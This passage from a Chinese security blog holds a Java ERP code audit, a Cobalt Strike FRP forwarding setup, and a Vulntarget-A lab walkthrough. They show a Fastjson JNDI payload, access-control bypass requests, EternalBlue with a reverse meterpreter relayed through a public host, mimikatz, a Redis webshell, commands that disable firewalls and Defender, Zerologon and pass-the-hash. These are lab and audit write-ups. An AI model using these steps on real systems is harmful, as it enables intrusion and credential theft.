class="hljs-keyword">return</span> value;<br> &#125;<br></code></pre></td></tr></table></figure>

<p>详细利用可以看<a href="https://github.com/safe6Sec/Fastjson">https://github.com/safe6Sec/Fastjson</a></p>
<p>当我们不知道具体版本的情况下利用下面的代码探测版本</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&#123;<br>  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102153651813.png" alt="image-20250102153651813"></p>
<p>虽然这里没有回显，但是其实报错已经有了版本</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102153719821.png" alt="image-20250102153719821"></p>
<p>使用{“@type”:”java.net.Inet4Address”,”val”:”01z8zqebq8y495se6ypru6f08rei2ez2o.oastify.com”}探测一下</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022191119014.png" alt="image-20241022191119014"></p>
<p>可以看到DNS是有记录的，证明存在 Fastjson 漏洞，然后我们进一步构造 payload。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022191128135.png" alt="image-20241022191128135"></p>
<p>使用<a href="https://github.com/cckuailong/JNDI-Injection-Exploit-Plus">https://github.com/cckuailong/JNDI-Injection-Exploit-Plus</a></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102154143186.png" alt="image-20250102154143186"></p>
<p>构造</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://localhost:1099/remoteExploit8&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102154450060.png" alt="image-20250102154450060"></p>
<p>但是我们看到<code>autoType</code>没有开启</p>
<h1 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h1><h2 id="重置密码"><a href="#重置密码" class="headerlink" title="重置密码"></a>重置密码</h2><p>jsh账户有重置密码的权限，登录jsh账户抓一个重置密码的包</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102143357584.png" alt="image-20250102143357584"></p>
<p>普通账户没有重置密码的功能，不过我们可以利用未授权访问中的方法来绕过。也就是说，我们可以利用普通用户构造如下数据包来越权修改他人的密码为初始密码<code>123456</code>，我们先登录用户<code>jsh</code>&#x2F;<code>123456</code>，然后抓包改包为如下内容(注意这里删除cookie，这样就是在未授权的情况下重置他人的密码)：</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102150407547.png" alt="image-20250102150407547"></p>
<p>可以看到密码修改成功了</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102150722194.png" alt="image-20250102150722194"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102143432284.png" alt="image-20250102143432284"></p>
<p>让我们跟进代码逻辑看看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">    <span class="hljs-meta">@PostMapping(value = &quot;/resetPwd&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">resetPwd</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;id&quot;)</span> Long id,</span><br><span class="hljs-params">                                     HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Map&lt;String, Object&gt; objectMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123456&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">md5Pwd</span> <span class="hljs-operator">=</span> Tools.md5Encryp(password);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">update</span> <span class="hljs-operator">=</span> userService.resetPwd(md5Pwd, id);<br>        <span class="hljs-keyword">if</span>(update &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> returnJson(objectMap, message, ErpInfo.OK.code);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> returnJson(objectMap, message, ErpInfo.ERROR.code);<br>        &#125;<br>    &#125;<br><br><br><br>com.jsh.erp.service.user.UserService#resetPwd    <br>     <span class="hljs-meta">@Transactional(value = &quot;transactionManager&quot;, rollbackFor = Exception.class)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">resetPwd</span><span class="hljs-params">(String md5Pwd, Long id)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">int</span> result=<span class="hljs-number">0</span>;<br>        logService.insertLog(<span class="hljs-string">&quot;用户&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(BusinessConstants.LOG_OPERATION_TYPE_EDIT).append(id).toString(),<br>                ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest());<br>        <span class="hljs-type">User</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> getUser(id);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> u.getLoginName();<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;admin&quot;</span>.equals(loginName))&#123;<br>            logger.info(<span class="hljs-string">&quot;禁止重置超管密码&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>            user.setId(id);<br>            user.setPassword(md5Pwd);<br>            <span class="hljs-keyword">try</span>&#123;<br>                result=userMapper.updateByPrimaryKeySelective(user);<br>            &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>                JshException.writeFail(logger, e);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br></code></pre></td></tr></table></figure>



<p><img src="https://image.sp4rks.xyz/2025/01/image-20241216142220808.png" alt="image-20241216142220808"></p>
<p>可以看到写的非常简单，除了admin用户的密码不能更改，其他的都可以通过这个方式更改。可以结合前面的未授权访问综合利用。</p>
<h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><p>登录自己的用户抓一个修改密码的包</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102132756709.png" alt="image-20250102132756709"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">POST /user/updatePwd HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.66</span><span class="hljs-number">.71</span>:<span class="hljs-number">8081</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">133.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">133.0</span><br>Accept: application/json, text/javascript, *<span class="hljs-comment">/*; q=0.01</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Content-Length: 39</span><br><span class="hljs-comment">Origin: http://192.168.66.71:8081</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Referer: http://192.168.66.71:8081/pages/user/password.html</span><br><span class="hljs-comment">Cookie: JSESSIONID=37852FF6DA4CF637247A0462EDEAF2BD</span><br><span class="hljs-comment">Priority: u=0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">userId=137&amp;password=44444&amp;oldpwd=123456</span><br></code></pre></td></tr></table></figure>

<p>我这个用户的id是137，当我把id改为138也是成功了</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102142750571.png" alt="image-20250102142750571"></p>
<p>实战场景下，可以看有没有用户没有修改默认密码的。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102140930464.png" alt="image-20250102140930464"></p>
<h2 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h2><p>我们先用 admin 的账户抓一个 <code>deleteUser</code> 的包</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102151156587.png" alt="image-20250102151156587"></p>
<p>可以用同样的方式绕过(删除cookie)</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102151212376.png" alt="image-20250102151212376"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102151254729.png" alt="image-20250102151254729"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102151518564.png" alt="image-20250102151518564"></p>
<p>看一下代码逻辑，接收参数ids，使用逗号,分割，调用<code>userMapperEx.batDeleteOrUpdateUser()</code>方法将ids参数拼接进sql语句进行删除，这里没有对当前执行删除用户操作的用户身份做判断。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241216152835673.png" alt="image-20241216152835673"></p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://javaguide.cn/system-design/framework/spring/spring-common-annotations.html#_2-spring-bean-%E7%9B%B8%E5%85%B3">Spring&amp;SpringBoot常用注解总结</a></p>
<p><a href="https://xz.aliyun.com/t/13525?time__1311=GqmxuDcieiqeqGNDQi5BKwODRx7Tsh0RfbD">深入学习Java代码审计技巧—详细剖析某erp漏洞</a></p>
<p><a href="https://drun1baby.top/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/">java 代码审计之华夏 ERP CMS v2.3</a></p>
<p><a href="https://mp.weixin.qq.com/s/L2WI3DNR8LWQnUYSrzdnbA">【代码审计系列】第一篇：华夏ERP（附java代码审计方法论总结）</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>JAVA代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>用FRP实现Cobalt Strike本地上线</title>
    <url>/2024/07/03/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%88%A9%E7%94%A8FRP%E5%AE%9E%E7%8E%B0cobalt%20strike%E6%9C%AC%E5%9C%B0%E4%B8%8A%E7%BA%BF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如果将Cobalt Strike部署在VPS上，长期使用VPS会被标记。另外，大家使用的一般是破解版，不能确保没有后门之类的东西。那可以将CS部署在虚拟机里，利用FRP转发上线。</p>
<p>比如现在有三个角色：公网服务器：41.24.10.40      CS服务器：192.168.73.98（虚拟机里）      靶机：192.168.112.130(可以访问公网)</p>
<h2 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h2><p>在公网服务器上frp绑定端口7000</p>
<p><img src="https://image.sp4rks.xyz/2024/07/image-20240703205441550.png" alt="image-20240703205441550"></p>
<p>CS服务器的FRP配置</p>
<p><img src="https://image.sp4rks.xyz/2024/07/image-20240703211315532.png" alt="image-20240703211315532"></p>
<p>CS生成监听器选择公网服务器的地址</p>
<p><img src="https://image.sp4rks.xyz/2024/07/image-20240703205751820.png" alt="image-20240703205751820"></p>
<p>CS服务器是内网机器（<code>192.168.73.98</code>），它运行了一个木马程序，在 <code>6000</code> 端口上监听。但是这台内网机器无法直接从公网访问。</p>
<p>通过配置这个FRP客户端，它会将本地 <code>192.168.73.98:6000</code> 的TCP流量转发到公网上的FRP服务器 (<code>41.24.10.40:7000</code>)。FRP服务器会将这个流量转发到公网的 <code>6000</code> 端口，因此，外部网络可以通过访问 <code>41.24.10.40:6000</code> 来访问内网中运行的木马程序。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看小迪的视频，他的操作是：CS服务器的FRP配置中，本地端口与公网服务器端口不一样，然后用CS生成两个监听器，一个是CS服务器的IP+它本地端口；另一个是远程服务器IP+公网服务器端口，生成木马用远程服务器IP+公网服务器端口这个监听器。他成功了上线了，我死活不成功。我还以为CS问题，防火墙问题，马儿的问题，怀疑各种问题，反正没怀疑他视频。然后从昨天搞到今天，反正不嘻嘻 :r</p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title>内网靶场渗透实战-Vulntarget-A</title>
    <url>/2024/08/31/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98-Vulntarget-A/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>靶机地址：<a href="https://github.com/crow821/vulntarget">Vulntarget 👋</a></p>
<p>网络拓扑：</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240822001242022.png" alt="image-20240822001242022"></p>
<p><strong>WIN 7外网地址：192.168.158.203</strong></p>
<p><strong>攻击机：192.168.112.147</strong></p>
<p><strong>公网主机：47.XX.X.XX</strong></p>
<p>攻击机使用WIN11与WSL2 KALI （镜像网络，强烈推荐，各种代理确实方便）</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902131412262.png" alt="image-20240902131412262"></p>
<h1 id="WIN-7"><a href="#WIN-7" class="headerlink" title="WIN 7"></a>WIN 7</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>用最低5000的速率扫描192.168.158.203全端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT --min-rate <span class="hljs-number">5000</span> -p- <span class="hljs-number">192.168.158.203</span><br></code></pre></td></tr></table></figure>


<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902143707020.png" alt="image-20240902143707020"></p>
<p>看到暴露的端口，我们心底需要对其重要性做一个排序，例如这里，首要攻击点肯定是<strong>80</strong>或者<strong>445</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT -sV -sC -O -p80,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">445</span> <span class="hljs-number">192.168.158.203</span><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902143738793.png" alt="image-20240902143738793"></p>
<p>对端口做更详细的扫描，看到是WIN7的主机，并且暴露了<strong>445</strong>端口，那不经让我们想到 <strong>MS17-101</strong>，继续使用NMAP自带的漏洞扫描脚本，看看有没有低摘的果子</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT --script=vuln -p80,<span class="hljs-number">135</span>,<span class="hljs-number">138</span>,<span class="hljs-number">445</span> <span class="hljs-number">192.168.158.203</span><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902144433511.png" alt="image-20240902144433511"></p>
<p>坐实了永恒之蓝，优先级肯定是比<strong>80</strong>端口高，直接用MSF打就行</p>
<h2 id="永恒之蓝利用"><a href="#永恒之蓝利用" class="headerlink" title="永恒之蓝利用"></a>永恒之蓝利用</h2><p>同时注意到我们的靶机的IP为<strong>192.168.158.203</strong>，攻击机的IP为<strong>192.168.112.147</strong>，那这MSF肯定不能直接使用反向SHELL，因为不在一个网段，反弹不回来</p>
<p>解决办法暂时可以想到两点：</p>
<ol>
<li>使用正向的payload，但是同时又有问题，假如靶机的防火墙开着(事实上也确实开着)，那这个方法也不行,我们根本连接不到靶机的其他端口</li>
<li>使用公网主机当跳板机</li>
</ol>
<hr>
<p>Frpc配置文件：</p>
<p>将本机的4444端口，转发到公网主机的4445</p>
<p>本机6000-&gt;公网主机6000；本机8000-&gt;公网主机8000；本机9000-&gt;公网主机9000；</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902150748030.png" alt="image-20240902150748030"></p>
<p>Frps配置文件：</p>
<p>公网主机连接7000端口就行</p>
<hr>
<p>开启<code>msf</code>，搜索<code>search ms17-010</code></p>
<p>使用<code>set exploit/windows/smb/ms17_010_eternalblue</code></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902151352591.png" alt="image-20240902151352591"></p>
<p><code>show options</code>查看需要的参数</p>
<p>设置 RHOSTS、LHOST、LPORT</p>
<p>注意要将LHOST、LPORT设置刚刚Frp转发到的公网主机的IP和端口</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902152047108.png" alt="image-20240902152047108"></p>
<p>另外开一个MSF监听</p>
<p>加载监听模块 <code>use exploit/multi/handler</code></p>
<p>设置反向payload <code>set payload windows/x64/meterpreter/reverse_tcp</code></p>
<p>先run起来</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902152725018.png" alt="image-20240902152725018"></p>
<p>然后再run前面的攻击模块	</p>
<p>可以参考这篇文章<a href="https://forum.butian.net/share/1832">看我用内网MSF打公网永恒之蓝</a></p>
<hr>
<p>看到是双网卡的机器</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902153030789.png" alt="image-20240902153030789"></p>
<p>没有杀软</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902153300193.png" alt="image-20240902153300193"></p>
<p>退出终端，加载<code>mimikataz</code>模块；抓一下密码，看到用户名是win7；密码是admin，并且不在域内</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902153805343.png" alt="image-20240902153805343"></p>
<p><code>run get_local_subnets</code>查看本地网络连接子网段</p>
<p>添加一条动态路由<code>run autoroute -s 10.0.20.0/24</code></p>
<p>看一下存活主机<code>use post/windows/gather/arp_scanner</code></p>
<p>可以看到<strong>10.0.20.99</strong>这台机器</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902160323058.png" alt="image-20240902160323058"></p>
<h3 id="WIN7上线CS"><a href="#WIN7上线CS" class="headerlink" title="WIN7上线CS"></a>WIN7上线CS</h3><h4 id="方式一-MSF会话注入CS"><a href="#方式一-MSF会话注入CS" class="headerlink" title="方式一:MSF会话注入CS"></a>方式一:MSF会话注入CS</h4><p>已经拿到meterpreter，可以直接利用MSF会话注入CS</p>
<p>使用payload_inject模块<code>use exploit/windows/local/payload_inject</code></p>
<p>HOST设置成为公网主机地址，端口设置成刚刚FRP转发的端口6000</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902154810047.png" alt="image-20240902154810047"></p>
<p><code>sessions -l</code>查看当前会话</p>
<p>我这里会话ID是1，直接使用，<code>set disablepayloadhandler true</code>不让MSF启动监听器</p>
<p>CS监听公网主机的地址和6000端口</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902155253524.png" alt="image-20240902155253524"></p>
<p>讲一下为什么这样设置，<code>payload_inject</code>模块<code>LHOST</code>如果设置成192.168.112.147，LPORT为4444的话，payload会试图直接连接到攻击机的地址和端口 (<code>192.168.112.147:4444</code>)，这个连接肯定无法建立，因为 <code>192.168.112.147</code> 是一个私有 IP 地址，不可通过公网直接访问。当你设置 <code>LHOST</code> 为 <code>公网主机地址</code> 和 <code>LPORT</code> 为 <code>6000</code> 时，payload 会连接到外网主机的 IP 和端口，通过 FRP，已经将攻击机的 <code>6000</code> 端口穿透到公网的 <code>6000</code> 端口。因此，靶机可以通过公网访问到这个地址，并成功上线到 CS。</p>
<h4 id="方式二：上传后门"><a href="#方式二：上传后门" class="headerlink" title="方式二：上传后门"></a>方式二：上传后门</h4><p>使用刚刚的监听器生成后门</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902164242466.png" alt="image-20240902164242466"></p>
<p>通过MSF上传文件命令 <code>upload</code>上传，<code>execute</code>执行</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902164612977.png" alt="image-20240902164612977"></p>
<h2 id="通达OA利用"><a href="#通达OA利用" class="headerlink" title="通达OA利用"></a>通达OA利用</h2><p>上面我们提到了80端口，看到是通达oa，通达历史上也爆过很多漏洞，GitHub很多开源的工具，直接梭哈</p>
<p><a href="https://github.com/xiaokp7/TongdaOATool">通达OA漏洞利用工具v1.6</a></p>
<h1 id="Server-2016"><a href="#Server-2016" class="headerlink" title="Server 2016"></a>Server 2016</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>在上面查看一下存活主机的时候看到一个IP地址为<strong>10.0.20.99</strong>的机器</p>
<p>我们不能直接和<strong>10.0.20.99</strong>通信，WIN7可以，直接使用WIN7做一个socks代理</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902172415420.png" alt="image-20240902172415420"></p>
<p>修改proxychains的配置</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902172556198.png" alt="image-20240902172556198"></p>
<p>通过nmap扫描目标IP的常用端口</p>
<p><code>proxychains nmap -sT -Pn 10.0.20.99 -p22,23,80,139,445,1433,3306,3389,6379,8080</code></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902172911362.png" alt="image-20240902172911362"></p>
<p>对于扫描结果我们同样也是值得关注的，<strong>80</strong>与6379端口</p>
<p><strong>6379</strong>端口如果是未授权访问或者是知道密钥的情况下的利用方式有：WEBSHELL、计划任务、写入SSH公钥等等</p>
<p>去看看80端口是什么东西，同样的，我们不能直接访问，还是利用刚刚的socks代理</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902173010096.png" alt="image-20240902173010096"></p>
<p>Proxifier是windows下面类似于proxychains的软件，由于我们WSL2是镜像网络，那Proxifier直接使用刚刚的socks端口即可；访问10.0.20.99我们看到是一个WEB页面</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902173050266.png" alt="image-20240902173050266"></p>
<p>直接dirsearch开扫，l.php和phpinfo.php都暴露了绝对路径</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902195541700.png" alt="image-20240902195541700"></p>
<h2 id="Redis未授权利用"><a href="#Redis未授权利用" class="headerlink" title="Redis未授权利用"></a>Redis未授权利用</h2><p><img src="https://image.sp4rks.xyz/2024/09/image-20240902200630990.png" alt="image-20240902200630990"></p>
<p>根据前边80站点拿到的路径，通过<code>redis-cli</code>咱们直接写入webshell；</p>
<p>随后哥斯拉启动！</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902200915404.png" alt="image-20240902200915404"></p>
<h3 id="Server2016上线CS"><a href="#Server2016上线CS" class="headerlink" title="Server2016上线CS"></a>Server2016上线CS</h3><p>同样的两种方式：</p>
<ol>
<li>因为我们已经上线了WIN7，那转发上线，用哥斯拉上传后门(这样需要关闭WIN7防火墙)</li>
<li>生成一个正向的监听器和后门，前面通过哥斯拉已经得到SHELL，用哥斯拉上传后门(这样需要关闭Server2016防火墙)</li>
</ol>
<p>殊途同归，我这里使用转发上线</p>
<p>WIN7关闭防火墙命令</p>
<figure class="highlight pf"><table><tr><td class="code"><pre><code class="hljs pf">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure>

<p>建监听器</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902201249415.png" alt="image-20240902201249415"></p>
<p>使用刚刚的监听器创建后门</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902202824986.png" alt="image-20240902202824986"></p>
<p>哥斯拉上传并执行后门，CS上线一气呵成；</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902203430848.png" alt="image-20240902203430848"></p>
<h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><p><code>ipconfig /all</code>一样的双网卡，在域内</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902204434347.png" alt="image-20240902204434347"></p>
<p><code>tasklist /svc</code>显示当前系统中正在运行的所有进程及其关联的服务</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902204319927.png" alt="image-20240902204319927"><br>很好奇啊，有杀软为啥没有杀后门啊</p>
<p>关闭Windows Defender</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">REG ADD <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> /v DisableAntiSpyware /t REG_DWORD /d 1 /f<br><br>gpupdate /force<br></code></pre></td></tr></table></figure>

<p><code>quser</code>显示当前登录到本地计算机或远程计算机上的用户信息</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902204533451.png" alt="image-20240902204533451"></p>
<p><code>netsh advfirewall show allprofiles</code>查看一下防火墙</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902204715493.png" alt="image-20240902204715493"></p>
<p>可以看到 入站流量默认被阻止，出站流量默认被允许</p>
<p>手动关一下<code>netSh advfirewall set allprofiles state off</code></p>
<p>通过端口扫描，发现了一台新的机器 <strong>10.0.10.110</strong></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902210716523.png" alt="image-20240902210716523"></p>
<h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><p><img src="https://image.sp4rks.xyz/2024/09/image-20240902211239171.png" alt="image-20240902211239171"></p>
<p>查找域控计算机名 <code>net group &quot;domain controllers&quot; /domain</code></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902211331701.png" alt="image-20240902211331701"></p>
<p>从而得知，域控主机名字为 WIN2019，IP地址为10.0.10.110</p>
<h1 id="Server-2019"><a href="#Server-2019" class="headerlink" title="Server 2019"></a>Server 2019</h1><p>同样的我们现在的socks代理是WIN7的，只能和Server2016通信，并不能直接通信域控主机，Server2016能和域控通信，我们通过Server2016建立socks代理</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902211858834.png" alt="image-20240902211858834"></p>
<p>proxychians改一下配置文件</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902212352022.png" alt="image-20240902212352022"></p>
<h2 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h2><p>接着拿域控大杀器Zerologon漏洞打一下（CVE-2020-1472）</p>
<p><a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902105142202.png" alt="image-20240902105142202"></p>
<p>就可以看到是检测出来有漏洞的</p>
<p>利用<code>https://github.com/dirkjanm/CVE-2020-1472</code>先将密码置空</p>
<p><a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902105814766.png" alt="image-20240902105814766"></p>
<p>下载impacket工具包</p>
<p><a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p>
<p>利用impacket工具包中examples目录下的secretsdump.py获取hash值</p>
<p>得到了hash<code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</code></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902221722603.png" alt="image-20240902221722603"></p>
<p>利用<code>smbexex.py</code>或 <code>wmiexec.py</code>横向移动，拿下<strong>域控</strong></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">proxychains python<span class="hljs-number">3</span> smbexec.py -hashes aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-keyword">c</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">654</span>da<span class="hljs-number">31</span>ce<span class="hljs-number">51</span>cbeecfef<span class="hljs-number">99e637</span>be<span class="hljs-number">15</span> administrator<span class="hljs-title">@10</span>.<span class="hljs-number">0.10</span>.<span class="hljs-number">110</span><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902222457300.png" alt="image-20240902222457300"></p>
<figure class="highlight pf"><table><tr><td class="code"><pre><code class="hljs pf">netsh advfirewall show allprofiles <span class="hljs-comment"># 查看防火墙配置（这里是乱码）</span><br>netSh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off <span class="hljs-comment"># 关闭防火墙</span><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902222527659.png" alt="image-20240902222527659"></p>
<h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>创建一个正向监听器</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902222611366.png" alt="image-20240902222611366"></p>
<p>使用刚刚创建的监听器，创建后门 (检查的时候发现这张图有问题，应该选择Windows Stageless Payload)</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902222718394.png" alt="image-20240902222718394"></p>
<p>因为Server2016有web服务，Server2016和2019能通信，直接上传后门</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902223029810.png" alt="image-20240902223029810"></p>
